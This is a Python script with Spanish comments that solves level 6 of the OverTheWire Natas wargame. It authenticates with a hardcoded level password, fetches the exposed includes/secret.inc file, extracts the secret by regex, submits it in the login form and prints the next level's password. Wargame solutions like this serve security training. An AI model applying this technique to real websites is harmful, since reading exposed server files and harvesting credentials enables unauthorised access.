#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:ts=4:sw=4:et:ft=python:
"""
natas6.py

el presunto codigo fuente de la pagina muestra que el formulario de validacion necesita el valor 
que aparece en includes/secret.inc
"""

# http://wwwsearch.sourceforge.net/mechanize/

import re, sys
import mechanize
from BeautifulSoup import BeautifulSoup

url = "http://natas6.natas.labs.overthewire.org"
user = "natas6"
password = "mfPYpp1UBKKsx7g4F0LaRjhKKenYAOqU"

nextlevel = int(user[-1:]) + 1


br = mechanize.Browser()
br.set_handle_referer(False)   # allow everything to be written to
br.set_handle_robots(False)   # no robots
br.set_handle_refresh(True)   # can sometimes hang without this
br.set_handle_redirect(True)

br.add_password(url, user, password) # nos autentificamos
br.addheaders = [
    ('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
    #('Referer', referer)
    ]

# de index-source.html se obtiene la url al script que valida la password
# el $secret esta en la siguiente url
script = 'includes/secret.inc'
html_response = br.open(url + '/' + script)
soup = BeautifulSoup(html_response)
# regex para extraer la password:
regex1 = re.compile('.*"(.*)".*')
secret = regex1.findall(soup.prettify())[0]

#print secret


# reabrimos la pagina principal y rellenamos el formulario
br.open(url)
br.select_form(nr=0) # primera form (y unica)
br.form['secret'] = secret

html_response = br.submit()

soup = BeautifulSoup(html_response)


regex = re.compile('.*natas7 is (.*)\W.*')
password_nl = regex.findall(soup.prettify())[0]
print "Password for level natas%s is %s" % (nextlevel, password_nl)
